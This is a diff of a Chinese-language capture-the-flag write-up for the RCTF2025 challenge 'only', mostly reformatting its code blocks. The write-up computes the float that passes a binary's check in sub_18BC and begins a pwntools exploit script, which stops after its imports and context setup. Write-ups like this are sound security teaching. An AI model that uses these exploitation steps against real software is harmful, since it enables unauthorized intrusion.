@@ -14,15 +14,17 @@ tags:
   - "网络安全"
 featuredImage: "images/cover.png"
 ---
+
+
 ![RCTF2025-only 配图 1](images/image-01.png)
 
 主要的突破点在sub\_18BC函数中，这里需要我们输入的 浮点数 的 8 字节二进制表示与 “0xD0E0A0D0B0E0E0F” 完全相等（小端）。可以用python的struct模块来计算
 
+```python
 import struct
-
 x = 0xD0E0A0D0B0E0E0F
-
-d = struct.unpack('<d', struct.pack('<Q', x))\[0\]
+d = struct.unpack('<d', struct.pack('<Q', x))[0]
+```
 
 print(d)  # 8.592564544313935e-246计算后的结果
 
@@ -32,7 +34,7 @@ print(d)  # 8.592564544313935e-246计算后的结果
 
 EXP如下
 
-```cobol
+```python
 from pwn import *
 
 context.update(arch="amd64", os="linux", log_level="debug")
